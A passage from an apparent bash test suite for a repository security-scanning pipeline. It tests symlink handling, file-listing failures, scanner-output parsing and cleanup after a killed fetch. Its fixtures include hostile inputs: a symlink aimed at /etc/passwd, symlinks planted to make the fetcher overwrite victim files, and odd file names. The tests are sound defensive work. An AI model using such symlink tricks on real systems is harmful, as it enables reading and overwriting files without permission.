        assert_eq "[FAIL] symlink:target_outside_the_scanned_directory" "$(k_msgs "$KREP" "${K9E}/passwd_link")" "F9 [${K_ENG}]: …and the link is the finding"
        TRANSIT_ENGINE="$K_ENG" run_pipeline "$K9Z" --quiet
        K9ZIP=$(ls "${RUN_WORK}"/out/*.zip 2>/dev/null | sed -n '1p')
        assert_eq "0" "$RUN_EXIT" "F9 [${K_ENG}]: ai_transit.sh approves the repository whose links stay inside (a file link and a directory link)"
        assert_eq "ll" "$([[ -n "$K9ZIP" ]] && unzip -Z "$K9ZIP" file_link dir_link 2>/dev/null | cut -c1 | tr -d '\n')" \
            "F9 [${K_ENG}]: …the archive holds both as links (zip -y)"
        assert_eq "1 1" "$([[ -n "$K9ZIP" ]] && echo "$(unzip -p "$K9ZIP" | grep -c KMARK_FILE) $(unzip -p "$K9ZIP" | grep -c KMARK_DIR)")" \
            "F9 [${K_ENG}]: …and the content of each target is in it once, as the real file, not again through the link"
        assert_eq "0" "$([[ -n "$K9ZIP" ]] && unzip -Z1 "$K9ZIP" | grep -c '^dir_link/')" "F9 [${K_ENG}]: …no entry below the directory link"
        TRANSIT_ENGINE="$K_ENG" run_pipeline "$K9E" --quiet
        assert_eq "1 0" "$RUN_EXIT $(ls "${RUN_WORK}"/out/*.zip 2>/dev/null | wc -l | tr -d ' ')" \
            "F9 [${K_ENG}]: ai_transit.sh rejects a link to /etc/passwd and builds no archive that would carry the file"
    done

    # ── F10: a file listing that failed is a hard FAIL, not 'every file excluded' ───────────────────────
    # The listing was read through a process substitution with the status thrown away: a find that cannot start (a .transitignore
    # too long for the argument limit) or cannot read a directory listed nothing, and that read "every file excluded" (with a
    # .transitignore) or a PASS with layers 4 and 5 "ran" (without). It is now engine:file_listing_failed on __global__, which
    # --min-severity and the allowlist do not lower, and layers 4 and 5 say why they did not run.
    K10="${SCRATCH}/k10"; rm -rf "$K10"; mkdir -p "$K10/ti" "$K10/plain" "$K10/allow" "$K10/big"
    for _d in ti plain allow big; do printf 'print(1)\n' > "$K10/$_d/ok.py"; done
    printf 'zzz\n' > "$K10/ti/.transitignore"; printf 'zzz\n' > "$K10/allow/.transitignore"
    printf '[{"rule":"engine","path":"__global__","reason":"x"},{"rule":"file_listing_failed","path":"__global__","reason":"x"}]\n' > "$K10/allow/.transit-allow.json"
    # one pattern longer than the kernel's limit for a single argument (32 pages): the -path argument made of it cannot be passed to find
    python3 -I -c "import sys; sys.stdout.write('p' * (33 * int(sys.argv[1])) + '\n')" "$(getconf PAGESIZE 2>/dev/null || echo 4096)" > "$K10/big/.transitignore"
    # a find that exits 3 and prints nothing for the listing of layer 5 (and is the real find for every other call), and one that
    # prints the real listing and then exits 1, as find does when it cannot read a directory
    K10S1=$(k_stubdir k10_none);    k_wrap "$K10S1" find 'case "$*" in *" -type f -print0") [ "$1" = . ] || exit 3 ;; esac'
    K10S2=$(k_stubdir k10_partial); k_wrap "$K10S2" find 'case "$*" in *" -type f -print0") if [ "$1" != . ]; then "$REAL" "$@"; exit 1; fi ;; esac'
    K10_L="L4_patterns=skipped:file listing failed (find exit 3) L5_per_language_sast=skipped:file listing failed (find exit 3)"
    for K_ENG in bash python; do
        KENV=(TRANSIT_ENGINE="$K_ENG"); k_scan "$K10/ti" "k10_ctl_${K_ENG}"; KENV=()
        assert_eq "PASS ran ran" "$(k_verdict) $(k_cov L4_patterns) $(k_cov L5_per_language_sast)" "F10 [${K_ENG}]: control, the real find: a clean repository with a .transitignore passes, layers 4 and 5 ran"
        KENV=(TRANSIT_ENGINE="$K_ENG" PATH="${K10S1}:${PATH}"); k_scan "$K10/ti" "k10_none_${K_ENG}"; KENV=()
        assert_eq "FAIL 1" "$(k_verdict) $KEC" "F10 [${K_ENG}]: a find that exits 3 with no output fails the scan (the same repository as the control)"
        assert_contains "$(k_global)" "[FAIL] engine:file_listing_failed" "F10 [${K_ENG}]: …with the FAIL engine:file_listing_failed on __global__"
        assert_not_contains "$(k_global)" "engine:nothing_scanned" "F10 [${K_ENG}]: …and it is not reported as 'every file excluded' although a .transitignore is present"
        assert_eq "$K10_L" "$(k_layers)" "F10 [${K_ENG}]: …layers 4 and 5 say the listing failed, with find's exit status"
        assert_contains "$(k_py "$KREP" "d['coverage_gaps']")" "L4_patterns" "F10 [${K_ENG}]: …and it is a coverage gap"
        assert_eq "1 engine:file_listing_failed __global__" \
            "$(k_py "$KREP" "' '.join(str(x) for x in (len(d['findings']), d['findings'][0]['message'], d['findings'][0]['file']))")" \
            "F10 [${K_ENG}]: …one structured finding record"
        assert_contains "$KOUT" "(find exit 3)" "F10 [${K_ENG}]: …the console names the exit status"
        KENV=(TRANSIT_ENGINE="$K_ENG" PATH="${K10S1}:${PATH}"); k_scan "$K10/plain" "k10_plain_${K_ENG}"; KENV=()
        assert_eq "FAIL" "$(k_verdict)" "F10 [${K_ENG}]: …and without a .transitignore too (it used to be a PASS, layers 4 and 5 'ran', with nothing examined)"
        KENV=(TRANSIT_ENGINE="$K_ENG" PATH="${K10S2}:${PATH}"); k_scan "$K10/plain" "k10_partial_${K_ENG}"; KENV=()
        assert_eq "FAIL" "$(k_verdict)" "F10 [${K_ENG}]: a find that prints the listing and then exits 1 fails the scan although every file was seen"
        assert_eq "L4_patterns=skipped:file listing failed (find exit 1) L5_per_language_sast=skipped:file listing failed (find exit 1)" "$(k_layers)" \
            "F10 [${K_ENG}]: …layers 4 and 5 are not ran (find exit 1)"
        KENV=(TRANSIT_ENGINE="$K_ENG" PATH="${K10S1}:${PATH}" MIN_SEVERITY=critical); k_scan "$K10/allow" "k10_allow_${K_ENG}"; KENV=()
        assert_contains "$(k_global)" "[FAIL] engine:file_listing_failed" "F10 [${K_ENG}]: neither --min-severity critical nor an allowlist entry for it lowers engine:file_listing_failed"
        assert_eq "FAIL" "$(k_verdict)" "F10 [${K_ENG}]: …the verdict stays FAIL"
        KENV=(TRANSIT_ENGINE="$K_ENG"); k_scan "$K10/big" "k10_big_${K_ENG}"; KENV=()
        assert_eq "FAIL" "$(k_verdict)" "F10 [${K_ENG}]: a .transitignore too long for the argument limit (one pattern over 32 pages) fails the scan"
        assert_contains "$(k_global)" "[FAIL] engine:file_listing_failed" "F10 [${K_ENG}]: …as engine:file_listing_failed"
        assert_not_contains "$(k_global)" "engine:nothing_scanned" "F10 [${K_ENG}]: …not as 'every file excluded'"
        assert_contains "$(k_cov L4_patterns)" "skipped:file listing failed (find exit " "F10 [${K_ENG}]: …layer 4 says the listing failed"
    done

    # ── F11: a ScanCode report that cannot be read ───────────────────────────────────────────────────
    # RUN_SCANCODE=true, a scancode that exits 0 and writes a file the reader cannot use (garbage, an empty file, a truncated one,
    # JSON of the wrong shape). The reader exits non-zero; as a plain assignment under set -e that ended the whole run with no
    # report. It is now the WARN scancode:report_could_not_be_read and L6_licence 'skipped:scancode report could not be read'.
    k11_stub() {   # k11_stub <name> <sh that writes the report to $out>: a scancode that finds its --json-pp argument and runs the body
        local s; s=$(k_stubdir "k11_$1"); k_stub "$s" scancode "while [ \$# -gt 0 ]; do case \"\$1\" in --json-pp) out=\"\$2\" ;; esac; shift; done; $2"; printf '%s' "$s"
    }
    K11_GARBAGE=$(k11_stub garbage "echo 'this is not json' > \"\$out\"")
    K11_EMPTY=$(k11_stub empty ": > \"\$out\"")
    K11_TRUNC=$(k11_stub truncated "printf '{\"files\": [{\"path\": \"README.md\", \"license_det' > \"\$out\"")
    K11_LIST=$(k11_stub list "echo '[]' > \"\$out\"")
    K11_SHAPE=$(k11_stub shape "echo '{\"files\":\"x\"}' > \"\$out\"")
    K11_OK=$(k11_stub ok "echo '{\"files\":[]}' > \"\$out\"")
    K11_GPL=$(k11_stub gpl "echo '{\"files\":[{\"path\":\"README.md\",\"license_detections\":[{\"matches\":[{\"spdx_license_expression\":\"GPL-3.0-only\",\"score\":100}]}]}]}' > \"\$out\"")
    K11_VULN=$(k11_stub vuln "echo '{\"files\":[{\"path\":\"README.md\",\"packages\":[{\"name\":\"p\",\"version\":\"1\",\"vulnerabilities\":[{\"vulnerability_id\":\"CVE-1\",\"max_severity\":\"high\"}]}]}]}' > \"\$out\"")
    for K_ENG in bash python; do
        for _c in "garbage|a file that is not JSON|$K11_GARBAGE" "empty|an empty file|$K11_EMPTY" "truncated|a truncated JSON document|$K11_TRUNC" \
                  "list|JSON of the wrong shape (a list)|$K11_LIST" "shape|JSON of the wrong shape (files is a string)|$K11_SHAPE"; do
            _n="${_c%%|*}"; _rest="${_c#*|}"; _what="${_rest%%|*}"; _stub="${_rest#*|}"
            KENV=(TRANSIT_ENGINE="$K_ENG" PATH="${_stub}:${PATH}" RUN_SCANCODE=true); k_scan "$K_CLEAN" "k11_${_n}_${K_ENG}"; KENV=()
            assert_eq "PASS 0" "$(k_verdict) $KEC" "F11 [${K_ENG}]: ScanCode exits 0 and writes ${_what}: the run completes with a report and its verdict"
            assert_eq "skipped:scancode report could not be read" "$(k_cov L6_licence)" "F11 [${K_ENG}]: …L6_licence says so (${_n})"
            assert_contains "$(k_global)" "[WARN] scancode:report_could_not_be_read" "F11 [${K_ENG}]: …with the WARN scancode:report_could_not_be_read (${_n})"
            if [[ "$_n" == garbage ]]; then
                assert_eq "PASS" "$(k_tail)" "F11 [${K_ENG}]: …the last line of the output is the verdict"
                assert_not_contains "$KOUT" "ScanCode report:" "F11 [${K_ENG}]: …and the console does not claim the report was used"
                assert_contains "$(k_py "$KREP" "d['coverage_gaps']")" "L6_licence" "F11 [${K_ENG}]: …it is a coverage gap"
                assert_eq "False" "$(k_py "$KREP" "d['coverage_complete']")" "F11 [${K_ENG}]: …and coverage is not complete"
            fi
        done
        KENV=(TRANSIT_ENGINE="$K_ENG" PATH="${K11_OK}:${PATH}" RUN_SCANCODE=true); k_scan "$K_CLEAN" "k11_ok_${K_ENG}"; KENV=()
        assert_eq "PASS ran" "$(k_verdict) $(k_cov L6_licence)" "F11 [${K_ENG}]: control, a readable empty report: ran"
        assert_not_contains "$(k_global)" "report_could_not_be_read" "F11 [${K_ENG}]: …no WARN"
        KENV=(TRANSIT_ENGINE="$K_ENG" PATH="${K11_GPL}:${PATH}" RUN_SCANCODE=true); k_scan "$K_CLEAN" "k11_gpl_${K_ENG}"; KENV=()
        assert_eq "PASS ran" "$(k_verdict) $(k_cov L6_licence)" "F11 [${K_ENG}]: a readable report with a GPL licence is still read: ran…"
        assert_contains "$(k_msgs "$KREP" "${K_CLEAN}/README.md")" "[WARN] licence:GPL-3.0-only" "F11 [${K_ENG}]: …and the licence is a WARN on the file"
        KENV=(TRANSIT_ENGINE="$K_ENG" PATH="${K11_VULN}:${PATH}" RUN_SCANCODE=true); k_scan "$K_CLEAN" "k11_vuln_${K_ENG}"; KENV=()
        assert_eq "FAIL ran" "$(k_verdict) $(k_cov L6_licence)" "F11 [${K_ENG}]: a readable report with a HIGH vulnerability still fails the scan"
        assert_contains "$(k_msgs "$KREP" "${K_CLEAN}/README.md")" "[FAIL] scancode_vuln:CVE-1[HIGH]" "F11 [${K_ENG}]: …on the file"
    done

    # ── F12: the fetcher does not write through a link in the repository, and a file name cannot corrupt the manifest ─
    # `find | sort | while read -r f; do sha256sum "$f"; done > "$MANIFEST"` wrote through a .manifest_sha256.txt that the repository
    # ships as a symlink (into any file the user can write, or creating one), and a name with a newline, a leading blank or a
    # backslash broke the loop. The list is now written to a file of ours outside the copy and moved over the name.
    K12="${SCRATCH}/k12"; rm -rf "$K12"; mkdir -p "$K12/victims"
    k12_fetch() {   # k12_fetch <repo> <work dir>: runs fetch_repo.sh on a local directory; sets K12_EC and K12_DEST
        rm -rf "$2"; mkdir -p "$2"
        (cd "$ROOT_DIR" && WORK_DIR="$2" bash ./fetch_repo.sh "$1" >/dev/null 2>&1); K12_EC=$?
        K12_DEST=$(cat "$2/.fetch_result" 2>/dev/null || true)
    }
    mkdir -p "$K12/link" "$K12/dangling" "$K12/names/sub"
    printf 'print(1)\n' > "$K12/link/ok.py"; printf 'VICTIM_ORIGINAL\n' > "$K12/victims/victim.txt"
    ln -s "${K12}/victims/victim.txt" "$K12/link/.manifest_sha256.txt"
    k12_fetch "$K12/link" "$K12/link_work"
    assert_eq "0" "$K12_EC" "F12: fetch_repo.sh copies a local repository whose .manifest_sha256.txt is a symlink"
    assert_eq "VICTIM_ORIGINAL" "$(cat "$K12/victims/victim.txt")" "F12: …the file the link pointed at is unchanged (the manifest was not written through the link)"
    assert_eq "regular" "$([[ -f "$K12_DEST/.manifest_sha256.txt" && ! -L "$K12_DEST/.manifest_sha256.txt" ]] && echo regular || echo other)" \
        "F12: …the manifest in the copy is a regular file, not the link"
    assert_eq "1" "$(grep -c 'ok\.py$' "$K12_DEST/.manifest_sha256.txt" 2>/dev/null || true)" "F12: …and it lists the repository's file"
    printf 'print(1)\n' > "$K12/dangling/ok.py"; ln -s "${K12}/victims/created_by_the_manifest.txt" "$K12/dangling/.manifest_sha256.txt"
    k12_fetch "$K12/dangling" "$K12/dangling_work"
    assert_eq "absent" "$([[ -e "$K12/victims/created_by_the_manifest.txt" || -L "$K12/victims/created_by_the_manifest.txt" ]] && echo present || echo absent)" \
        "F12: a dangling link at the manifest's name does not make the fetcher create the file it points to"
    mkdir -p "$K12/dirlink" "$K12/victims/dir"; printf 'print(1)\n' > "$K12/dirlink/ok.py"; ln -s "${K12}/victims/dir" "$K12/dirlink/.manifest_sha256.txt"
    k12_fetch "$K12/dirlink" "$K12/dirlink_work"
    assert_eq "0 regular" "$K12_EC $([[ -f "$K12_DEST/.manifest_sha256.txt" && ! -L "$K12_DEST/.manifest_sha256.txt" ]] && echo regular || echo other)" \
        "F12: a link to a directory at the manifest's name is replaced by the manifest, the fetch completes"
    assert_eq "empty" "$([[ -z "$(ls -A "$K12/victims/dir")" ]] && echo empty || echo "holds: $(ls -A "$K12/victims/dir")")" \
        "F12: …and the directory it pointed at received nothing (mv into a link to a directory would have put the manifest there)"
    K12_NAMES=($'with\nnewline.txt' ' lead.txt' 'back\slash.txt' '-dash.txt' 'sub/ok.py')
    for _n in "${K12_NAMES[@]}"; do printf 'x\n' > "$K12/names/$_n"; done
    k12_fetch "$K12/names" "$K12/names_work"
    assert_eq "0" "$K12_EC" "F12: fetch_repo.sh copes with file names holding a newline, a leading blank, a backslash and a leading dash"
    K12_M="$K12_DEST/.manifest_sha256.txt"
    assert_eq "${#K12_NAMES[@]}" "$(wc -l < "$K12_M" 2>/dev/null | tr -d ' ')" "F12: …the manifest has one line for each of the ${#K12_NAMES[@]} files"
    assert_eq "0" "$(sha256sum -c --quiet "$K12_M" >/dev/null 2>&1; echo $?)" "F12: …and sha256sum -c accepts every line (the hashes belong to the named files)"
    assert_eq "1" "$(grep -cF 'with\nnewline.txt' "$K12_M" 2>/dev/null || true)" "F12: …the name with a newline is one line, escaped as sha256sum escapes it"
    assert_eq "0" "$(grep -c 'manifest_sha256' "$K12_M" 2>/dev/null || true)" "F12: …and the manifest does not list itself"

    # ── F13: a fetch that is killed leaves no temporary list, and the next run removes a stale one ───────
    # .diff_files.<pid> (git's list of changed files) and .manifest.<pid> (the manifest before it is moved into place) are removed by
    # an EXIT trap of fetch_repo.sh; ai_transit.sh removes what an earlier run that was killed (SIGKILL runs no trap) left behind.
    # A stub of the tool the fetcher is waiting for sleeps, records that the temporary file exists (so the test cannot pass because
    # the file was never there), and the fetcher gets SIGTERM.
    k13_kill() {   # k13_kill <stub dir> <direct|group> <argv…>: run in the background, wait until the stub runs, SIGTERM it; sets K13_SEEN, K13_EC
        # direct: the process itself gets SIGTERM. group: it runs under `timeout`, which forwards SIGTERM it receives to the command
        # and to its whole process group (what an operator's `timeout 300 ./ai_transit.sh` does), so the fetcher and the stub die with it.
        local s="$1" mode="$2" pid i; shift 2
        rm -f "$s/pid" "$s/seen"
        if [[ "$mode" == group ]]; then (cd "$ROOT_DIR" && exec timeout 120 "$@") >/dev/null 2>&1 &
        else (cd "$ROOT_DIR" && exec "$@") >/dev/null 2>&1 &
        fi
        pid=$!
        for i in $(seq 1 100); do [[ -s "$s/pid" ]] && break; sleep 0.1; done
        K13_SEEN=$(cat "$s/seen" 2>/dev/null || true)
        kill -TERM "$pid" 2>/dev/null || true
        for i in $(seq 1 50); do kill -0 "$pid" 2>/dev/null || break; sleep 0.1; done   # it ends at once; the stub is stopped only after that
        if [[ -s "$s/pid" ]]; then kill "$(cat "$s/pid")" 2>/dev/null || true; fi
        { wait "$pid"; } 2>/dev/null; K13_EC=$?
        return 0
    }
    k13_left() { ls -A "$1" 2>/dev/null | grep -cE '^\.(diff_files|manifest)\.' || true; }   # k13_left <work dir>: temporary lists still there
    K13P="${SCRATCH}/k13_plain"; rm -rf "$K13P"; mkdir -p "$K13P"; printf 'print(1)\n' > "$K13P/ok.py"
    K13M=$(k_stubdir k13_sha); k_wrap "$K13M" sha256sum "ls \"\$WORK_DIR\"/.manifest.* > '${K13M}/seen' 2>/dev/null; echo \$\$ > '${K13M}/pid'; exec sleep 37"
    K13W1="${SCRATCH}/k13_w1"; rm -rf "$K13W1"; mkdir -p "$K13W1"
    k13_kill "$K13M" direct env WORK_DIR="$K13W1" PATH="${K13M}:${PATH}" bash ./fetch_repo.sh "$K13P"
    assert_contains "$K13_SEEN" "/.manifest." "F13: while the manifest is computed, the temporary list exists (.manifest.<pid>): the test is not vacuous"
    assert_eq "143" "$K13_EC" "F13: …the fetcher ended by SIGTERM there exits 143"
    assert_eq "0" "$(k13_left "$K13W1")" "F13: …and leaves no .manifest.<pid>"
    if ! command -v git &>/dev/null; then
        skip_test "F13: a fetch killed during git diff leaves no .diff_files.<pid>" "git not installed"
    else
        K13G="${SCRATCH}/k13_git"; rm -rf "$K13G"; mkdir -p "$K13G"
        git init -q "$K13G"; git -C "$K13G" config user.email t@example.com; git -C "$K13G" config user.name t
        printf 'print(1)\n' > "$K13G/ok.py"; git -C "$K13G" add -A && git -C "$K13G" commit -qm base; K13B=$(git -C "$K13G" rev-parse HEAD)
        printf 'print(2)\n' > "$K13G/two.py"; git -C "$K13G" add -A && git -C "$K13G" commit -qm change
        K13S=$(k_stubdir k13_git); k_wrap "$K13S" git "case \" \$* \" in *\" diff \"*) ls \"\$WORK_DIR\"/.diff_files.* > '${K13S}/seen' 2>/dev/null; echo \$\$ > '${K13S}/pid'; exec sleep 37 ;; esac"
        K13W2="${SCRATCH}/k13_w2"; rm -rf "$K13W2"; mkdir -p "$K13W2"
        k13_kill "$K13S" direct env WORK_DIR="$K13W2" SINCE_COMMIT="$K13B" PATH="${K13S}:${PATH}" bash ./fetch_repo.sh "$K13G"
        assert_contains "$K13_SEEN" "/.diff_files." "F13: while git diff runs, the temporary list exists (.diff_files.<pid>): the test is not vacuous"
        assert_eq "143" "$K13_EC" "F13: …the fetcher ended by SIGTERM there exits 143"
        assert_eq "0" "$(k13_left "$K13W2")" "F13: …and leaves no .diff_files.<pid>"
        K13W3="${SCRATCH}/k13_w3"; rm -rf "$K13W3"; mkdir -p "$K13W3"
        k13_kill "$K13S" group env WORK_DIR="$K13W3" OUTPUT_DIR="${K13W3}/out" PATH="${K13S}:${PATH}" bash ./ai_transit.sh --quiet --since "$K13B" "$K13G"
        assert_contains "$K13_SEEN" "/.diff_files." "F13: ai_transit.sh --since: while git diff runs, the temporary list exists"
        assert_eq "0" "$(k13_left "$K13W3")" "F13: …ai_transit.sh and the fetcher it started, ended by SIGTERM together (under timeout), leave no temporary list"
    fi
    K13X="${SCRATCH}/k13_stale"; rm -rf "$K13X"; mkdir -p "$K13X"
    : > "$K13X/.diff_files.4242"; : > "$K13X/.manifest.4242"; : > "$K13X/.manifest_keep"
    (cd "$ROOT_DIR" && WORK_DIR="$K13X" OUTPUT_DIR="${K13X}/out" timeout 300 ./ai_transit.sh --quiet --no-zip --no-excel "$K_CLEAN" >/dev/null 2>&1); K13X_EC=$?
    assert_eq "0" "$K13X_EC" "F13: ai_transit.sh runs on a work directory that holds the leftovers of a killed fetch"
    assert_eq "0" "$(k13_left "$K13X")" "F13: …it removed the stale .diff_files.<pid> and .manifest.<pid> before it fetched"
    assert_eq "yes" "$([[ -e "$K13X/.manifest_keep" ]] && echo yes || echo no)" "F13: …and left alone a file that only looks similar (.manifest_keep)"
    # K-END
fi

# ════════════════════════════════════════════════════════════════════════════
# LAYER L — Fixes found while porting the engine to Python (each seen RED before the change, in both engines)
# ════════════════════════════════════════════════════════════════════════════
group "Layer L — fixes found by the Python port"
if ! _skipping; then
    LW="${SCRATCH}/l_work"; LR="${SCRATCH}/l_rep"; mkdir -p "$LW" "$LR"
    l_scan() {   # l_scan <engine> <dir> <name> <stub dir>; sets LREP, LEC
        LREP="${LR}/report_scan_$3.json"; rm -f "$LREP"
        (cd "$ROOT_DIR" && TRANSIT_ENGINE="$1" PATH="$4:${PATH}" WORK_DIR="$LW" timeout 300 bash ./scan_pipeline.sh "$2" "$LR" "$3" >/dev/null 2>&1); LEC=$?
    }
    l_py() { python3 -c "
import json, sys
d = json.load(open(sys.argv[1]))
print(eval(sys.argv[2]))" "$@" 2>/dev/null || echo "unreadable"; }
    l_stub() {   # l_stub <name> [tool, default bandit] <body on stdin>: a stand-in for a scanner, in its own directory
        local d="${SCRATCH}/l_st_$1" t="${2:-bandit}"; rm -rf "$d"; mkdir -p "$d"
        { printf '#!/bin/sh\n'; cat; } > "$d/$t"; chmod +x "$d/$t"; printf '%s' "$d"
    }
    LB="${SCRATCH}/l_bandit_repo"; rm -rf "$LB"; mkdir -p "$LB"; printf 'print(1)\n' > "$LB/a.py"
    # What real bandit 1.9.4 prints: title-case severity, the test named in the Issue line, no "Test ID" line, and a
    # LOW issue ahead of the one that matters. The check used to look for upper-case MEDIUM|HIGH and a "Test ID" line,
    # so it never fired with the real tool.
    L_REAL=$(l_stub real <<'STUB'
cat <<'OUT'
Run started:2026-11-14 11:34:23

Test results:
>> Issue: [B404:blacklist] Consider possible security implications associated with the subprocess module.
   Severity: Low   Confidence: High
   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
   Location: ./a.py:1:0
--------------------------------------------------
>> Issue: [B602:subprocess_popen_with_shell_equals_true] subprocess call with shell=True identified, security issue.
   Severity: High   Confidence: High
   CWE: CWE-78 (https://cwe.mitre.org/data/definitions/78.html)
   Location: ./a.py:2:0
OUT
STUB
)
    L_MED=$(l_stub med <<'STUB'
printf '>> Issue: [B306:blacklist] Use of insecure and deprecated function (mktemp).\n   Severity: Medium   Confidence: High\n'
STUB
)
    L_LOW=$(l_stub low <<'STUB'
printf '>> Issue: [B404:blacklist] Consider possible security implications.\n   Severity: Low   Confidence: High\n'
STUB
)
    L_OLD=$(l_stub old <<'STUB'
printf '>> Issue: x\n   Test ID: B602\n   Severity: HIGH   Confidence: High\n'
STUB
)
    L_BIG=$(l_stub big <<'STUB'
printf '>> Issue: [B602:y] z\n   Severity: High   Confidence: High\n'; head -c 300000 /dev/zero | tr '\0' 'x'; printf '\n'
STUB
)
    for LE in bash python; do
        l_scan "$LE" "$LB" "l_real_$LE" "$L_REAL"
        assert_eq "FAIL" "$(l_py "$LREP" "d['verdict']")" "bandit [$LE]: real bandit output (title case, Issue line) with a High finding fails the file"
        assert_contains "$(l_py "$LREP" "d['file_results'][sys.argv[3]]['message']" "${LB}/a.py")" "bandit:Severity: High:B602" \
            "bandit [$LE]: …naming the High finding and its test, not the Low issue before it"
        l_scan "$LE" "$LB" "l_med_$LE" "$L_MED"
        assert_eq "FAIL" "$(l_py "$LREP" "d['verdict']")" "bandit [$LE]: a Medium finding fails the file too"
        l_scan "$LE" "$LB" "l_low_$LE" "$L_LOW"
        assert_eq "PASS" "$(l_py "$LREP" "d['verdict']")" "bandit [$LE]: a Low finding alone does not"
        l_scan "$LE" "$LB" "l_old_$LE" "$L_OLD"
        assert_contains "$(l_py "$LREP" "d['file_results'][sys.argv[3]]['message']" "${LB}/a.py")" "bandit:Severity: HIGH:B602" \
            "bandit [$LE]: the upper-case form with a Test ID line is still read as before"
        l_scan "$LE" "$LB" "l_big_$LE" "$L_BIG"
        assert_eq "FAIL" "$(l_py "$LREP" "d['verdict']")" "bandit [$LE]: a finding followed by 300 KB of output is not lost (grep -q exits at the first match)"
    done
    # cppcheck (stderr is part of what is read): a large output with the finding late must not be lost to a SIGPIPE under
    # pipefail (echo | grep -q), and a message that ends right after "error:" must not abort the whole scan under set -e
    # (the extraction `grep -o | head -1` found no text after the colon and failed the pipeline).
    LC="${SCRATCH}/l_cpp_repo"; rm -rf "$LC"; mkdir -p "$LC"; printf 'int main(void) { return 0; }\n' > "$LC/a.c"
    L_CBIG=$(l_stub cpp_big cppcheck <<'STUB'
{ printf 'a.c:3:5: error: Buffer is accessed out of bounds [bufferAccessOutOfBounds]\n'; head -c 300000 /dev/zero | tr '\0' 'x'; printf '\n'; } >&2
STUB
)
    L_CEMPTY=$(l_stub cpp_empty cppcheck <<'STUB'
printf 'a.c:1: error:\n' >&2
STUB
)
    L_COK=$(l_stub cpp_ok cppcheck <<'STUB'
printf 'Checking a.c ...\n' >&2
STUB
)
    L_CREAL=$(l_stub cpp_real cppcheck <<'STUB'
printf 'a.c:3:5: error: Buffer is accessed out of bounds [bufferAccessOutOfBounds]\n' >&2
STUB
)
    # checkov: the same SIGPIPE shape (`echo "$out" | grep -q FAILED` under pipefail) with the first FAILED line followed by a lot of output
    LT="${SCRATCH}/l_tf_repo"; rm -rf "$LT"; mkdir -p "$LT"; printf 'variable "x" {}\n' > "$LT/main.tf"
    L_KBIG=$(l_stub ck_big checkov <<'STUB'
printf 'Check: CKV_AWS_1: x\n\tFAILED for resource: r\n'; head -c 300000 /dev/zero | tr '\0' 'x'; printf '\n'
STUB
)
    L_KOK=$(l_stub ck_ok checkov <<'STUB'
printf 'Check: CKV_AWS_1: x\n\tPASSED for resource: r\n'
STUB
)
    for LE in bash python; do
        l_scan "$LE" "$LT" "l_kbig_$LE" "$L_KBIG"
        assert_eq "FAIL" "$(l_py "$LREP" "d['verdict']")" "checkov [$LE]: a FAILED check followed by 300 KB of output is not lost"
        assert_contains "$(l_py "$LREP" "d['file_results'][sys.argv[3]]['message']" "${LT}/main.tf")" "checkov:1_CIS_IaC_findings" "checkov [$LE]: …and is counted"
        l_scan "$LE" "$LT" "l_kok_$LE" "$L_KOK"
        assert_eq "PASS" "$(l_py "$LREP" "d['verdict']")" "checkov [$LE]: only passed checks pass"
    done
    for LE in bash python; do
        l_scan "$LE" "$LC" "l_cbig_$LE" "$L_CBIG"
        assert_eq "FAIL" "$(l_py "$LREP" "d['verdict']")" "cppcheck [$LE]: a finding followed by 300 KB of output is not lost (grep -q exits at the first match)"
        l_scan "$LE" "$LC" "l_cempty_$LE" "$L_CEMPTY"
        assert_eq "FAIL" "$(l_py "$LREP" "d['verdict']")" "cppcheck [$LE]: a message that ends right after 'error:' fails the file and the run still writes its report"
        assert_contains "$(l_py "$LREP" "d['file_results'][sys.argv[3]]['message']" "${LC}/a.c")" "cppcheck:" "cppcheck [$LE]: …recorded as a cppcheck finding"
        l_scan "$LE" "$LC" "l_cok_$LE" "$L_COK"
        assert_eq "PASS" "$(l_py "$LREP" "d['verdict']")" "cppcheck [$LE]: output with no error or warning passes"
        l_scan "$LE" "$LC" "l_creal_$LE" "$L_CREAL"
        assert_contains "$(l_py "$LREP" "d['file_results'][sys.argv[3]]['message']" "${LC}/a.c")" "cppcheck:error: Buffer is accessed out of bounds" \
            "cppcheck [$LE]: an ordinary finding keeps its text"
    done
fi

# ═════════════════════════════════════════════════════════════════════════════
# LAYER F — Static checks on the pipeline itself
# ═════════════════════════════════════════════════════════════════════════════
group "Layer F — static checks"
if ! _skipping; then
    # Under set -u, bash 5.2 treats a declared-but-empty associative array as unbound for
    # ${#NAME[@]}: an allowlist of [] and a diff with no existing files aborted the scan.
    BAD=$(python3 - "${ROOT_DIR}/scan_pipeline.sh" <<'PY'
import re, sys
src = open(sys.argv[1], encoding="utf-8").read()
bad = [m.group(1) for m in re.finditer(r'^\s*declare -A (\w+)(?![\w=])', src, re.M)
       if re.search(r'\$\{#' + m.group(1) + r'\[[@*]\]\}', src)]
print(" ".join(bad))
PY
)
    if [[ -z "$BAD" ]]; then
        ok_test "scan_pipeline.sh measures no associative array that is declared without ()"
    else
        fail_test "scan_pipeline.sh measures no associative array that is declared without ()" "$BAD"
    fi
    for f in ai_transit.sh fetch_repo.sh scan_pipeline.sh docker-run.sh; do
        if bash -n "${ROOT_DIR}/${f}" 2>/dev/null; then
            ok_test "${f} parses"
        else
            fail_test "${f} parses" "$(bash -n "${ROOT_DIR}/${f}" 2>&1 | head -3)"
        fi
    done

    for f in selfcheck.py generate_excel_report.py; do
        if python3 -c "import ast;ast.parse(open('${ROOT_DIR}/${f}').read())" 2>/dev/null; then
            ok_test "${f} parses"
        else
            fail_test "${f} parses"
        fi
    done

    # `local` outside a function is valid syntax but aborts at runtime under
    # `set -e` ("local: can only be used in a function") -- exactly the
    # regression that silently broke private-repo cloning. bash -n cannot see
    # it, so check statically here.
    #
    # Depth is tracked by net brace balance per line: one-line definitions such
    # as `info() { echo; }` open and close on the same line, so a naive counter
    # that only decrements on a lone `}` would stay permanently incremented and
    # never report anything.
    for f in ai_transit.sh fetch_repo.sh scan_pipeline.sh docker-run.sh; do
        BAD=$(awk '
            {
                line = $0
                sub(/#.*$/, "", line)
                gsub(/\047[^\047]*\047/, "", line)
                gsub(/"[^"]*"/, "", line)

                if (depth == 0 && $0 ~ /^[[:space:]]*local[[:space:]]/)
                    print FILENAME ":" NR ": " $0

                n = gsub(/\{/, "{", line)
                m = gsub(/\}/, "}", line)
                depth += n - m
                if (depth < 0) depth = 0
            }
        ' "${ROOT_DIR}/${f}")
        if [[ -z "$BAD" ]]; then
            ok_test "${f} has no top-level 'local'"
        else
